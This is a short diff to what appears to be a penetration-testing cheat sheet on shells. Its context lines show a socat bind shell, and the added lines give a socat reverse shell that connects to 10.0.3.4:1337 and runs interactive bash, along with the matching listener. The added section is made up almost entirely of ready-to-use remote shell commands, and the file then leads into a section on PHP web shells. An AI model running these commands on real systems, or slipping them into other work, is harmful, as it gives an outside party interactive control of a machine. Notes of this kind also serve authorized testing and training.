@@ -22,6 +22,16 @@ socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 socat FILE:`tty`,raw,echo=0 TCP:localhost:1337
 ```
 
+### reverse
+
+```bash
+socat TCP:10.0.3.4:1337 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
+```
+
+```bash
+socat file:`tty`,raw,echo=0 TCP-LISTEN:1337
+```
+
 ## PHP
 
 These are the most common types of shells we'll be turning to, as like it or not, PHP is probably the most common type of web server application.
